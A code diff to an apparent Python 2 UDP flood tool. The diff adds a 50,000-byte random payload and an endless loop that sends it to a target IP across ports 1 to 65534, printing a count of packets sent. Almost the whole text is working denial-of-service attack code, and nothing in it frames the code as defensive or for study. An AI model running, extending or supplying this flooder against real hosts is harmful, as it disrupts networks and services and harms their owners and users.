@@ -16,6 +16,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 bytes = random._urandom(50)
 bytes1 = random._urandom(25)
+bytes2 = random._urandom(50000)
 
 try:
    os.system("clear")
@@ -57,6 +58,13 @@ try:
                        print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
                        if port == 65534:
                          port = 1
+                       while True:
+                            sock.sendto(bytes2, (ip,port))
+                            sent = sent + 1
+                            port = port + 1
+                            print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+                            if port == 65534:
+                              port = 1
 
 except KeyboardInterrupt:
       print('\n' + R + '[!]' + C + ' Keyboard Interrupt! Terminaling...' + W)
